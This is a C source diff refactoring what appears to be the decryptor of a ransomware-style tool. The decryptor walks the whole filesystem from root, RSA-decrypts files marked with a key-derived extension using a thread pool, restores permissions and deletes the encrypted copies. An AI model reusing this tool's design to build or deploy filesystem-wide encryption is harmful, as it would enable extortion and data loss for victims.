@@ -34,9 +34,20 @@
 #include "../lib/rsa.h"
 #include "../lib/util.h"
 
-char *EXT = NULL;
+typedef struct decrypt_args {
+  struct stat *st;
+  char *file;
+  char *ext;
+} decrypt_args_t;
+
+void decrypt_args_free(decrypt_args_t *args){
+  free(args->file);
+  free(args->st);
+  free(args);
+}
 
 void decrypt_file(void *arg) {
+  decrypt_args_t *args = arg;
   EVP_PKEY_CTX *ctx = NULL;
 
   unsigned char in_buf[OUTPUT_SIZE];
@@ -45,10 +56,10 @@ void decrypt_file(void *arg) {
   size_t in_len  = 0;
   size_t out_len = 0;
 
-  bool success = false;
+  bool ok = false;
 
-  char *in_file = arg;
-  int   name_sz = strlen(in_file) - (strlen(EXT) + 1);
+  char *in_file = args->file;
+  int   name_sz = strlen(in_file) - (strlen(args->ext) + 1);
   char  out_file[name_sz + 1];
 
   for (int i = 0; i < name_sz; i++)
@@ -59,25 +70,25 @@ void decrypt_file(void *arg) {
   FILE *out = fopen(out_file, "a");
 
   if (NULL == in || NULL == out) {
-    debug("(%s) Failed to open in/out", in_file);
+    debug("Failed to open in/out: %s", in_file);
     goto FREE;
   }
 
   ctx = rsa_decrypt_init();
   if (NULL == ctx) {
-    debug("(%s) Failed to create ctx", in_file);
+    debug("Failed to create ctx: %s", in_file);
     goto FREE;
   }
 
   while ((in_len = fread(in_buf, 1, OUTPUT_SIZE, in)) > 0) {
     out_len = OUTPUT_SIZE;
     if (!rsa_decrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
-      debug("(%s) Failed to decrypt (%lu -> %lu)", in_file, in_len, out_len);
+      debug("Failed to decrypt %s (%lu -> %lu)", in_file, in_len, out_len);
       goto FREE;
     }
 
     if (fwrite(out_buf, 1, out_len, out) <= 0) {
-      debug("(%s) Failed to write output", in_file);
+      debug("Failed to write output: %s", in_file);
       goto FREE;
     }
 
@@ -85,17 +96,17 @@ void decrypt_file(void *arg) {
       break;
   }
 
-  if (!copy_stat(fileno(in), fileno(out))) {
-    debug("(%s) Failed to copy perms", in_file);
+  if (!copy_stat(fileno(out), args->st)) {
+    debug("Failed to copy perms: %s", in_file);
     goto FREE;
   }
 
   if (unlink(in_file) < 0) {
-    debug("(%s) Failed to unlink: %s", in_file);
+    debug("Failed to unlink: %s", in_file);
     goto FREE;
   }
 
-  success = true;
+  ok = true;
 
 FREE:
   if (NULL != ctx)
@@ -107,15 +118,15 @@ FREE:
   if (NULL != out)
     fclose(out);
 
-  if (!success) {
+  if (!ok) {
     error("Failed to decrypt file: %s", in_file);
     unlink(out_file);
   }
 
-  free(in_file);
+  decrypt_args_free(args);
 }
 
-void decrypt_files(char *path, threadpool pool) {
+void decrypt_files(char *path, char *ext, threadpool pool) {
   if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run"))
     return;
 
@@ -145,17 +156,25 @@ void decrypt_files(char *path, threadpool pool) {
 
     if ((st.st_mode & S_IFMT) == S_IFDIR) {
       debug("Decrypting directory: %s...", fp);
-      decrypt_files(fp, pool);
+      decrypt_files(fp, ext, pool);
       continue;
     }
 
     if (st.st_size <= 0)
       continue;
 
-    if (has_valid_ext(fp, EXT)) {
-      debug("Decrypting file: %s...", fp);
-      thpool_add_work(pool, decrypt_file, strdup(fp));
-    }
+    if (!has_valid_ext(fp, ext))
+      continue;
+
+    decrypt_args_t *args = malloc(sizeof(decrypt_args_t));
+    args->file = strdup(fp);
+    args->ext  = ext;
+
+    args->st   = malloc(sizeof(struct stat));
+    memcpy(args->st, &st, sizeof(struct stat));
+
+    debug("Decrypting file: %s...", fp);
+    thpool_add_work(pool, decrypt_file, args);
   }
 
   closedir(dir);
@@ -168,12 +187,8 @@ int main(int argc, char *argv[]) {
     return EXIT_FAILURE;
   }
 
-  if (DEBUG_MODE)
-    DEBUG = true;
-
   char ext[8] = {0}, *sum = get_md5(BUILD_PUB);
   snprintf(ext, 8, "%.5s", sum);
-  EXT = ext;
 
   if (access("/", R_OK & W_OK) < 0) {
     error("Failed to access the root path");
@@ -187,9 +202,9 @@ int main(int argc, char *argv[]) {
 
   threadpool pool = thpool_init(20);
   if (argc >= 2)
-    decrypt_files(argv[1], pool);
+    decrypt_files(argv[1], ext, pool);
   else
-    decrypt_files("/", pool);
+    decrypt_files("/", ext, pool);
   thpool_wait(pool);
 
 DONE:
